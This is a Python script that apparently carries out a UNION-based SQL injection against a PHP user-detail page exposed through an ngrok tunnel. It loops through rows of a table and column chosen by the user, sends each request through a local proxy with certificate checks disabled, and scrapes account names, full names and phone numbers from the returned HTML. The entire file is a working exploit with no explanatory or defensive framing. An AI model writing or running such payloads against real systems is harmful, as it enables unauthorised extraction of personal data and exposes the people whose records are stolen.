import requests
import urllib
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = "https://9063-2001-ee0-40e1-3068-b8f8-1a47-c246-4b0e.ngrok-free.app/user-detail.php?id=1"

def sqli(url, rownum, col1, col2, col3, table):
    for i in range (1, rownum):
        payload = " union select null,%s,null,%s,null,null,null,null,null,%s from %s limit %s,1-- " % (col1, col2, col3, table, i)
        malurl = url + urllib.parse.quote(payload)
        r = requests.get(url=malurl, proxies=proxies, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for li in soup.find_all('li'):
            if "Tài khoản" in li.text:
                print(col1 + ": " + li.text.strip())
            if "Họ và tên" in li.text:
                print(col2 + ": " + li.text.strip())
            if "Số điện thoại" in li.text:
                print(col3 + ": " + li.text.strip())

def main():
    rownum = int(input("numbers of rows: "))
    table = input("table name: ")
    col1 = input("column 1: ")
    col2 = input("column 2: ")
    col3 = input("column 3: ")
    sqli(url, rownum, col1, col2, col3, table)
    
if __name__ == "__main__":
    main()